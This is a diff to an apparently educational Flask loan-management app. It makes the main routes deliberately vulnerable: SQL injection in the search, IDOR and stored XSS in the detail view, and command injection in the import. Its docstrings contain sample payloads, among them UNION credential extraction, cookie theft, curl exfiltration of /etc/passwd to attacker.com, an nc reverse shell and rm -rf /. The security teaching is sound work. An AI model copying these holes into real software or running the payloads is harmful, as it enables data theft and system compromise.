@@ -372,41 +372,76 @@ def dashboard():
 @login_required
 def list_applications():
     """
-    SECURE: List loan applications with proper access control.
+    VULNERABLE: SQL Injection via direct string concatenation.
 
-    Security Features:
-    1. Branch-based filtering (IDOR prevention)
-    2. Parameterized search (SQL injection prevention)
-    3. Input sanitization
-    4. Pagination (DoS prevention - not fully implemented here)
+    Vulnerability: CWE-89 (SQL Injection)
+    This endpoint builds SQL queries by concatenating user input directly,
+    allowing attackers to inject arbitrary SQL code.
 
-    Access Control:
-    - Branch officers: only their branch's applications
-    - HO officers/Admin: all applications
+    Attack Examples:
+    - ' OR 1=1 -- (bypass filters, see all applications)
+    - ' UNION SELECT id, username, password_hash... FROM users -- (extract credentials)
     """
     user = get_current_user()
-
-    # Get search query from URL parameter
     search_query = request.args.get("q", "").strip()
 
-    # Start with access-controlled query
-    query = get_accessible_applications_query(user)
-
-    # Apply search filter if provided (SECURE: uses ORM parameterization)
+    # VULNERABLE: Direct SQL concatenation
     if search_query:
-        sanitized_query = sanitize_search_input(search_query)
-        # SQLAlchemy automatically parameterizes this query (SQL injection safe)
-        # Search across multiple fields: CIF number, applicant name, and national ID
-        query = query.filter(
-            db.or_(
-                LoanApplication.application_ref.ilike(f"%{sanitized_query}%"),
-                LoanApplication.applicant_name.ilike(f"%{sanitized_query}%"),
-                LoanApplication.national_id.ilike(f"%{sanitized_query}%"),
-            )
-        )
+        raw_sql = f"""
+            SELECT 
+                id, application_ref, applicant_name, national_id, 
+                product_code, requested_amount, branch_code, status, created_at
+            FROM loan_applications
+            WHERE applicant_name LIKE '%{search_query}%'
+               OR application_ref LIKE '%{search_query}%'
+               OR national_id LIKE '%{search_query}%'
+            ORDER BY created_at DESC
+        """
 
-    # Order by most recent first
-    applications = query.order_by(LoanApplication.created_at.desc()).all()
+        # ============================================================
+        # SECURE ALTERNATIVE (Uncomment to enable protection):
+        # ============================================================
+        # query = get_accessible_applications_query(user)
+        # applications = query.filter(
+        #     db.or_(
+        #         LoanApplication.applicant_name.ilike(f"%{search_query}%"),
+        #         LoanApplication.application_ref.ilike(f"%{search_query}%"),
+        #         LoanApplication.national_id.ilike(f"%{search_query}%")
+        #     )
+        # ).order_by(LoanApplication.created_at.desc()).all()
+        #
+        # Defense Mechanism:
+        # - Uses ORM parameterized queries (SQLAlchemy automatically escapes)
+        # - No direct SQL string concatenation
+        # - Branch-level access control via get_accessible_applications_query()
+        # - OWASP: Input Validation + Parameterized Queries (CWE-89 prevention)
+        # ============================================================
+
+        try:
+            result = db.session.execute(text(raw_sql))
+            rows = result.mappings().all()
+            # Convert to LoanApplication-like objects for template compatibility
+            applications = []
+            for row in rows:
+                app = type("Application", (), {})()  # Create dynamic object
+                for key, value in row.items():
+                    # Convert created_at string back to datetime for template compatibility
+                    if key == "created_at" and isinstance(value, str):
+                        try:
+                            from datetime import datetime as dt
+
+                            value = dt.fromisoformat(value)
+                        except:
+                            pass  # Keep as string if conversion fails
+                    setattr(app, key, value)
+                applications.append(app)
+        except Exception as e:
+            flash(f"SQL Error: {str(e)}", "danger")
+            applications = []
+    else:
+        # No search - use ORM for basic listing
+        query = get_accessible_applications_query(user)
+        applications = query.order_by(LoanApplication.created_at.desc()).all()
 
     return render_template(
         "applications_list.html",
@@ -527,34 +562,156 @@ def new_application():
 @login_required
 def view_application(app_id):
     """
-    SECURE: View application details with access control.
+    VULNERABLE: Insecure Direct Object Reference (IDOR) + Stored XSS.
 
-    Security Features:
-    1. IDOR Prevention: Checks if user can access this specific application
-    2. XSS Prevention: Remarks field is auto-escaped by Jinja2
-    3. Audit trail: Could log who viewed what (not implemented here)
+    Vulnerabilities:
+    1. CWE-639 (IDOR): No access control check - any authenticated user can view any application
+    2. CWE-79 (Stored XSS): Remarks field rendered with |safe filter
 
-    Access Control:
-    - Branch officers: only their branch's applications
-    - HO officers/Admin: all applications
+    Attack Examples:
+    - Change URL from /applications/1 to /applications/100 (IDOR - access other branches)
+    - Store XSS payload in remarks: <script>alert(document.cookie)</script>
+    """
+    application = LoanApplication.query.get_or_404(app_id)
+
+    # VULNERABLE: NO access control check - IDOR vulnerability
+    # Missing: if not can_access_application(user, application): abort(403)
+
+    # ============================================================
+    # SECURE ALTERNATIVE (Uncomment to enable protection):
+    # ============================================================
+    # from security import can_access_application
+    # if not can_access_application(user, application):
+    #     flash(
+    #         "Access Denied: You don't have permission to view this application.",
+    #         "danger"
+    #     )
+    #     return redirect(url_for("list_applications"))
+    #
+    # Defense Mechanism:
+    # - Horizontal access control (checks branch ownership)
+    # - Role-based permissions (SUPER_ADMIN can access all)
+    # - OWASP: Broken Access Control prevention (CWE-639/IDOR)
+    # - Banking requirement: Data isolation between branches
+    # ============================================================
+
+    # Fetch credit check results if any
+    credit_check = CreditCheck.query.filter_by(application_id=app_id).first()
+
+    # Render vulnerable view (remarks with |safe filter, enabling XSS)
+    return render_template(
+        "application_detail.html",
+        application=application,
+        credit_check=credit_check,
+        vulnerable_view=True,  # Flag for template to use vulnerable rendering
+    )
+
+
+@app.route("/applications/<int:app_id>/edit", methods=["GET", "POST"])
+@login_required
+def edit_application(app_id):
+    """
+    Edit application details - allowed for Expert, HO, and Admin.
+
+    Permissions:
+    - Approval Expert: Can edit if application is in their branch
+    - Branch HO: Can edit applications from their branch
+    - Super Admin: Can edit any application
+    - Branch Officer: Can only edit their own DRAFT applications
     """
     user = get_current_user()
     application = LoanApplication.query.get_or_404(app_id)
 
-    # SECURITY CHECK: Enforce access control (IDOR prevention)
+    # Access control check
     if not can_access_application(user, application):
         flash(
-            f"⛔ Access Denied: You cannot view applications from branch {application.branch_code}. "
-            f"Your role ({user.role}) and branch ({user.branch_code}) do not permit this access.",
+            f"⛔ Access Denied: You cannot edit applications from branch {application.branch_code}.",
             "danger",
         )
         return redirect(url_for("list_applications"))
 
-    # Render secure view (remarks auto-escaped, preventing XSS)
+    # Role-based edit permissions
+    can_edit = False
+    if user.role == Role.SUPER_ADMIN:
+        can_edit = True
+    elif user.role == Role.BRANCH_HO:
+        can_edit = True
+    elif user.role == Role.APPROVAL_EXPERT:
+        can_edit = True
+    elif user.role == Role.BRANCH_OFFICER:
+        # BO can only edit their own DRAFT applications
+        can_edit = (
+            application.status == ApplicationStatus.DRAFT
+            and application.created_by_user_id == user.id
+        )
+
+    if not can_edit:
+        flash(
+            "⛔ You do not have permission to edit this application.",
+            "danger",
+        )
+        return redirect(url_for("view_application", app_id=app_id))
+
+    if request.method == "POST":
+        # Update application fields
+        try:
+            application.applicant_name = request.form.get("applicant_name", "").strip()
+            application.national_id = request.form.get("national_id", "").strip()
+
+            dob_str = request.form.get("dob", "").strip()
+            if dob_str:
+                application.dob = datetime.strptime(dob_str, "%Y-%m-%d").date()
+
+            application.contact_phone = request.form.get("contact_phone", "").strip()
+            application.contact_email = request.form.get("contact_email", "").strip()
+            application.residential_address = request.form.get(
+                "residential_address", ""
+            ).strip()
+            application.occupation = request.form.get("occupation", "").strip()
+            application.employer_name = request.form.get("employer_name", "").strip()
+
+            monthly_income_str = request.form.get("monthly_income", "").strip()
+            if monthly_income_str:
+                application.monthly_income = float(monthly_income_str)
+
+            application.product_code = request.form.get("product_code", "").strip()
+
+            requested_amount_str = request.form.get("requested_amount", "").strip()
+            if requested_amount_str:
+                application.requested_amount = float(requested_amount_str)
+
+            tenure_str = request.form.get("tenure_months", "").strip()
+            if tenure_str:
+                application.tenure_months = int(tenure_str)
+
+            application.loan_purpose = request.form.get("loan_purpose", "").strip()
+            application.remarks = request.form.get("remarks", "").strip()
+
+            # Expert and HO can update their remarks
+            if user.role == Role.APPROVAL_EXPERT:
+                expert_remarks = request.form.get("expert_remarks", "").strip()
+                if expert_remarks:
+                    application.expert_remarks = expert_remarks
+
+            if user.role in [Role.BRANCH_HO, Role.SUPER_ADMIN]:
+                ho_remarks = request.form.get("ho_remarks", "").strip()
+                if ho_remarks:
+                    application.ho_remarks = ho_remarks
+
+            application.updated_at = datetime.utcnow()
+            db.session.commit()
+
+            flash("✅ Application updated successfully.", "success")
+            return redirect(url_for("view_application", app_id=app_id))
+
+        except Exception as e:
+            db.session.rollback()
+            flash(f"⛔ Error updating application: {str(e)}", "danger")
+
+    # GET request - show edit form
+    current_year = datetime.now().year
     return render_template(
-        "application_detail.html",
-        application=application,
-        vulnerable_view=False,  # Flag for template to use secure rendering
+        "application_edit.html", application=application, current_year=current_year
     )
 
 
@@ -612,22 +769,29 @@ def update_application_status(app_id):
             current_status == ApplicationStatus.RETURNED_TO_BRANCH
             and new_status == ApplicationStatus.PENDING_EXPERT_REVIEW
         ):
-            # Resubmit after corrections
-            application.remarks = (
-                remarks if remarks else "Resubmitted after corrections"
-            )
-            valid_transition = True
+            # Resubmit after corrections - re-assign expert (might be different from previous)
+            experts = User.query.filter_by(
+                branch_code=application.branch_code,
+                role=Role.APPROVAL_EXPERT,
+                is_active=True,
+            ).all()
+            if experts:
+                application.assigned_expert_id = random.choice(experts).id
+                application.remarks = (
+                    remarks if remarks else "Resubmitted after corrections"
+                )
+                valid_transition = True
+            else:
+                error_message = "⛔ No approval experts available for this branch."
         else:
             error_message = "⛔ Branch Officers can only submit DRAFT or resubmit RETURNED applications."
 
     # APPROVAL EXPERT: Can approve (send to HO), send back to branch, or add remarks
     elif user.role == Role.APPROVAL_EXPERT:
-        # Verify expert is assigned to this application
-        if (
-            application.assigned_expert_id != user.id
-            and application.status == ApplicationStatus.PENDING_EXPERT_REVIEW
-        ):
-            error_message = "⛔ You are not assigned to this application."
+        # Expert from same branch can interact with applications
+        # SECURITY: Verify expert is from the same branch
+        if user.branch_code != application.branch_code:
+            error_message = f"⛔ You can only act on applications from your branch ({user.branch_code})."
         elif current_status == ApplicationStatus.PENDING_EXPERT_REVIEW:
             if new_status == ApplicationStatus.PENDING_HO_APPROVAL:
                 # Expert approves - send to HO
@@ -656,6 +820,12 @@ def update_application_status(app_id):
                     remarks if remarks else "Re-reviewed and approved"
                 )
                 valid_transition = True
+            elif new_status == ApplicationStatus.RETURNED_TO_BRANCH:
+                # Expert realizes application needs corrections from branch
+                application.expert_remarks = (
+                    remarks if remarks else "Returned to branch for corrections"
+                )
+                valid_transition = True
             else:
                 error_message = f"⛔ Invalid transition from {current_status}."
         else:
@@ -663,7 +833,10 @@ def update_application_status(app_id):
 
     # BRANCH HO: Can approve, reject, or send back to expert/branch
     elif user.role in [Role.BRANCH_HO, Role.SUPER_ADMIN]:
-        if current_status == ApplicationStatus.PENDING_HO_APPROVAL:
+        # SECURITY: Verify HO is from the same branch (but SUPER_ADMIN can access all)
+        if user.role == Role.BRANCH_HO and user.branch_code != application.branch_code:
+            error_message = f"⛔ You can only act on applications from your branch ({user.branch_code})."
+        elif current_status == ApplicationStatus.PENDING_HO_APPROVAL:
             if new_status == ApplicationStatus.APPROVED:
                 application.reviewed_by_ho_id = user.id
                 application.ho_remarks = (
@@ -986,7 +1159,77 @@ def view_cic_credit_report(app_id):
 
 
 # ============================================================================
-# SECURE BULK IMPORT (File Upload, No Shell Commands)
+# VULNERABLE BULK IMPORT (Command Injection)
+# ============================================================================
+
+
+@app.route("/import", methods=["GET", "POST"])
+@login_required
+@role_required(Role.BRANCH_HO, Role.SUPER_ADMIN)
+def vulnerable_bulk_import():
+    """
+    VULNERABLE: OS Command Injection via shell execution.
+
+    Vulnerability: CWE-78 (OS Command Injection)
+    Takes user input and passes it directly to shell commands.
+
+    Attack Examples:
+    - data.csv; whoami (execute additional commands)
+    - data.csv & dir (Windows command chaining)
+    - data.csv | curl http://attacker.com (data exfiltration)
+    """
+    user = get_current_user()
+    command_executed = None
+
+    if request.method == "POST":
+        filename = request.form.get("filename", "").strip()
+
+        # VULNERABLE: Building shell command with user input
+        command = f"python scripts/import_applications.py {filename}"
+        command_executed = command
+
+        # Show what would be executed (commented for safety in demo)
+        # os.system(command)  # THIS IS THE VULNERABILITY
+
+        # ============================================================
+        # SECURE ALTERNATIVE (Use /secure/import endpoint instead):
+        # ============================================================
+        # See lines 1187-1350 for complete secure implementation:
+        # - Direct file upload (request.files.get('csv_file'))
+        # - Filename validation (allowed_file() function)
+        # - CSV parsing with Python csv module (no shell)
+        # - No os.system() or subprocess calls with user input
+        #
+        # Defense Mechanism:
+        # - Avoid shell command execution entirely
+        # - Use Python libraries (csv.DictReader) for file processing
+        # - Input validation: whitelist allowed extensions
+        # - OWASP: OS Command Injection prevention (CWE-78)
+        # - Example: file.save(filepath); with open(filepath) as f:
+        # ============================================================
+
+        flash(
+            f"⚠️ Command would execute: {command}",
+            "warning",
+        )
+
+        # Detect injection attempts
+        if any(char in filename for char in [";", "&", "|", "`", "$("]):
+            flash(
+                "🚨 COMMAND INJECTION DETECTED! Shell metacharacters found. "
+                "In a real vulnerable system, arbitrary commands would execute.",
+                "danger",
+            )
+
+    return render_template(
+        "bulk_import.html",
+        vulnerable=True,
+        command_executed=command_executed,
+    )
+
+
+# ============================================================================
+# SECURE BULK IMPORT (File Upload, No Shell Commands) - DISABLED
 # ============================================================================
 
 
@@ -1161,287 +1404,46 @@ def secure_bulk_import():
 
 
 # ============================================================================
-# VULNERABLE ENDPOINTS - FOR EDUCATIONAL DEMONSTRATION ONLY
-# ============================================================================
-# ⚠️⚠️⚠️ WARNING: INSECURE CODE BELOW ⚠️⚠️⚠️
-# The following endpoints contain INTENTIONAL security vulnerabilities
-# for educational demonstration. NEVER use these patterns in production.
+# OLD VULNERABLE DEMONSTRATION ROUTES - DISABLED
+# Main routes are now vulnerable by default, these are kept for reference only
 # ============================================================================
 
+# The following /vuln/ routes are DISABLED as vulnerabilities
+# are now in the main application routes:
+# - /applications now has SQL injection (was /vuln/search)
+# - /applications/<id> now has IDOR+XSS (was /vuln/applications/<id>)
+# - /import now has command injection (was /vuln/import)
 
+
+# Redirect old /vuln/ routes to inform users
 @app.route("/vuln/search")
 @login_required
-def vulnerable_search():
-    """
-    🚨 VULNERABLE: SQL Injection via String Concatenation
-
-    Vulnerability Type: CWE-89 (SQL Injection)
-    OWASP: A03:2021 - Injection
-
-    What's Wrong:
-    This endpoint builds a SQL query by directly concatenating user input
-    without any parameterization or escaping. An attacker can inject
-    arbitrary SQL code to:
-    1. Bypass access controls (see all applications regardless of branch)
-    2. Exfiltrate sensitive data (applicant PII, financial details)
-    3. Modify or delete data (UPDATE, DELETE statements)
-    4. Potentially execute OS commands (via database-specific functions)
-
-    Attack Examples:
-    1. Bypass WHERE clause:
-       /vuln/search?q=' OR 1=1 --
-       Result: Returns ALL applications from ALL branches
-
-    2. UNION-based injection (extract other tables):
-       /vuln/search?q=' UNION SELECT id, username, password_hash, full_name, branch_code, role FROM users --
-       Result: Exposes all user credentials
-
-    3. Time-based blind injection (detect vulnerability):
-       /vuln/search?q=' AND (SELECT CASE WHEN (1=1) THEN (SELECT sleep(5)) ELSE 0 END) --
-       Result: Response delayed by 5 seconds if vulnerable
-
-    Real-World Impact:
-    - Heartland Payment Systems (2008): SQL injection led to 130M credit card theft
-    - TalkTalk (2015): SQL injection exposed 157,000 customer records, £400K fine
-    - Banks: Could violate PCI DSS, Basel III, GDPR → massive fines + reputation damage
-
-    Secure Alternative:
-    Use parameterized queries (ORM or prepared statements):
-    query.filter(LoanApplication.applicant_name.ilike(f"%{search}%"))
-
-    This is demonstrated in the secure /applications endpoint.
-    """
-    user = get_current_user()
-    search_query = request.args.get("q", "")
-
-    # 🚨 VULNERABLE: Direct string concatenation into SQL
-    # This is EXACTLY what NOT to do!
-    raw_sql = f"""
-        SELECT 
-            id, application_ref, applicant_name, national_id, 
-            product_code, requested_amount, branch_code, status, created_at
-        FROM loan_applications
-        WHERE applicant_name LIKE '%{search_query}%'
-        ORDER BY created_at DESC
-    """
-
-    # Note: Intentionally NO branch_code filter, so SQL injection can expose all data
-
-    try:
-        result = db.session.execute(text(raw_sql))
-        rows = result.mappings().all()
-    except Exception as e:
-        flash(f"SQL Error (possibly from injection attempt): {str(e)}", "danger")
-        rows = []
-
+def vulnerable_search_redirect():
     flash(
-        "⚠️ WARNING: This is a VULNERABLE endpoint demonstrating SQL Injection. "
-        "The search query is directly concatenated into SQL without parameterization. "
-        "Try payload: ' OR 1=1 --",
-        "danger",
+        "This route is deprecated. The main /applications route now has SQL injection vulnerability.",
+        "info",
     )
-
-    return render_template(
-        "attack_demo.html",
-        rows=rows,
-        attack_type="SQL Injection",
-        raw_sql=raw_sql,
-        search_query=search_query,
-    )
+    return redirect(url_for("list_applications"))
 
 
 @app.route("/vuln/applications/<int:app_id>")
 @login_required
-def vulnerable_view_application(app_id):
-    """
-    🚨 VULNERABLE: Insecure Direct Object Reference (IDOR) + Stored XSS
-
-    Vulnerability Type 1: CWE-639 (IDOR - Authorization Bypass)
-    OWASP: A01:2021 - Broken Access Control
-
-    What's Wrong (IDOR):
-    This endpoint does NOT check if the logged-in user has permission to
-    view the requested application. A branch officer from HCM01 can view
-    applications from HN01 by simply changing the URL:
-
-    /vuln/applications/1  → HCM01 application (legitimate)
-    /vuln/applications/2  → HN01 application (IDOR - should be blocked!)
-
-    Attack Scenario:
-    1. Branch officer logs in, sees their applications
-    2. Notes application IDs in URL (e.g., 1, 2, 3)
-    3. Manually changes URL to /vuln/applications/100
-    4. Gains access to other branches' sensitive customer data
-
-    Real-World Impact:
-    - IDOR is one of the most common vulnerabilities in web apps
-    - Leads to data breaches, privacy violations, regulatory fines
-    - Example: Facebook (2018) - Photo IDOR exposed 6.8M users' photos
-
-    ---
-
-    Vulnerability Type 2: CWE-79 (Stored XSS)
-    OWASP: A03:2021 - Injection
-
-    What's Wrong (XSS):
-    The remarks field is rendered using Jinja2's |safe filter, which
-    disables auto-escaping. If an attacker stores malicious JavaScript
-    in the remarks field, it will execute in victims' browsers.
-
-    Attack Scenario:
-    1. Attacker creates application with remarks: <script>alert('XSS')</script>
-    2. Or more maliciously: <script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>
-    3. When victim views this application, JavaScript executes
-    4. Attacker steals session cookies, performs actions as victim
-
-    Real-World Impact:
-    - Session hijacking (steal authentication cookies)
-    - Credential theft (fake login forms)
-    - Malware distribution
-    - Defacement
-    - Example: Samy worm (MySpace 2005) - XSS worm infected 1M users in 20 hours
-
-    Secure Alternatives:
-    1. IDOR: Check can_access_application(user, application) before rendering
-    2. XSS: Remove |safe filter, let Jinja2 auto-escape HTML
-
-    Both are demonstrated in the secure /applications/<id> endpoint.
-    """
-    application = LoanApplication.query.get_or_404(app_id)
-
-    # 🚨 VULNERABLE: NO access control check
-    # Missing: if not can_access_application(user, application): abort(403)
-
+def vulnerable_view_redirect(app_id):
     flash(
-        "⚠️ WARNING: This is a VULNERABLE endpoint demonstrating IDOR + Stored XSS. "
-        "(1) No branch access control - any user can view any application. "
-        "(2) Remarks field rendered with |safe - JavaScript will execute. "
-        "Try creating an application with remarks: <script>alert('XSS')</script>",
-        "danger",
+        "This route is deprecated. The main /applications/<id> route now has IDOR+XSS vulnerabilities.",
+        "info",
     )
-
-    # vulnerable_view=True tells template to use |safe filter (XSS vulnerability)
-    return render_template(
-        "application_detail.html",
-        application=application,
-        vulnerable_view=True,
-    )
+    return redirect(url_for("view_application", app_id=app_id))
 
 
-@app.route("/vuln/import", methods=["GET", "POST"])
+@app.route("/vuln/import")
 @login_required
-def vulnerable_bulk_import():
-    """
-    🚨 VULNERABLE: Command/Shell Injection
-
-    Vulnerability Type: CWE-78 (OS Command Injection)
-    OWASP: A03:2021 - Injection
-
-    What's Wrong:
-    This endpoint takes user input (filename) and passes it directly to
-    a shell command via os.system() without any validation or sanitization.
-
-    The Vulnerable Code Pattern:
-    filename = request.form.get("filename")
-    os.system(f"python scripts/import_applications.py {filename}")
-
-    An attacker can inject shell metacharacters to execute arbitrary commands:
-
-    Attack Examples:
-    1. Command chaining (Linux/Mac):
-       Input: data.csv; whoami
-       Executed: python scripts/import_applications.py data.csv; whoami
-       Result: Runs whoami command, reveals server username
-
-    2. Command chaining (Windows):
-       Input: data.csv & whoami
-       Executed: python scripts/import_applications.py data.csv & whoami
-       Result: Same as above
-
-    3. Data exfiltration:
-       Input: data.csv; curl http://attacker.com/exfil -d @/etc/passwd
-       Result: Sends /etc/passwd to attacker's server
-
-    4. Reverse shell (full system compromise):
-       Input: data.csv; nc -e /bin/bash attacker.com 4444
-       Result: Opens reverse shell, attacker gains full control
-
-    5. Denial of Service:
-       Input: data.csv; rm -rf / --no-preserve-root
-       Result: Deletes entire filesystem (if run as root)
-
-    Real-World Impact:
-    - Complete system compromise
-    - Data theft (customer PII, financial data, trade secrets)
-    - Ransomware deployment
-    - Regulatory violations (PCI DSS, GDPR)
-    - Example: Equifax (2017) - Command injection led to 147M records stolen
-
-    Secure Alternatives:
-    1. NEVER use os.system() or subprocess.run(shell=True) with user input
-    2. Use file upload (request.files) instead of filename strings
-    3. Parse files with Python libraries (csv, json, xml.etree) not shell tools
-    4. If shell is absolutely necessary:
-       - Use subprocess.run() with shell=False and argument list
-       - Validate input against strict whitelist
-       - Use shlex.quote() to escape special characters
-
-    Secure implementation is demonstrated in /secure/import endpoint.
-
-    Note: This vulnerable endpoint is DISABLED by default (comments out os.system).
-    To demonstrate the attack, the comment can be removed, but this is DANGEROUS
-    and should ONLY be done in an isolated VM/container for academic purposes.
-    """
-    user = get_current_user()
-    command_executed = None
-
-    if request.method == "POST":
-        filename = request.form.get("filename", "").strip()
-
-        # 🚨 EXTREMELY VULNERABLE: Building shell command with user input
-        # This is the EXACT pattern that leads to command injection
-        command = f"python scripts/import_applications.py {filename}"
-
-        # Store command for display (showing what WOULD be executed)
-        command_executed = command
-
-        # 🚨🚨🚨 DANGER ZONE 🚨🚨🚨
-        # The following line is COMMENTED OUT for safety.
-        # If uncommented, it would allow arbitrary command execution.
-        # NEVER do this in real code!
-
-        # os.system(command)  # ← THIS IS THE VULNERABILITY
-
-        # Instead, we just show the command that would be executed
-        flash(
-            f"⚠️ DANGER: The following command WOULD be executed (but is blocked for safety): {command}",
-            "danger",
-        )
-        flash(
-            "💡 Attack Demo: Try entering: data.csv; whoami  or  data.csv & dir  or  data.csv | curl http://attacker.com",
-            "info",
-        )
-
-        # Educational note about what would happen
-        if (
-            ";" in filename
-            or "&" in filename
-            or "|" in filename
-            or "`" in filename
-            or "$(" in filename
-        ):
-            flash(
-                "🚨 COMMAND INJECTION DETECTED! Shell metacharacters found in input. "
-                "In a real vulnerable system, this would execute arbitrary commands. "
-                "Attacker could steal data, install malware, or destroy the system.",
-                "danger",
-            )
-
-    return render_template(
-        "bulk_import.html",
-        vulnerable=True,
-        command_executed=command_executed,
+def vulnerable_import_redirect():
+    flash(
+        "This route is deprecated. The main /import route now has command injection vulnerability.",
+        "info",
     )
+    return redirect(url_for("vulnerable_bulk_import"))
 
 
 # ============================================================================
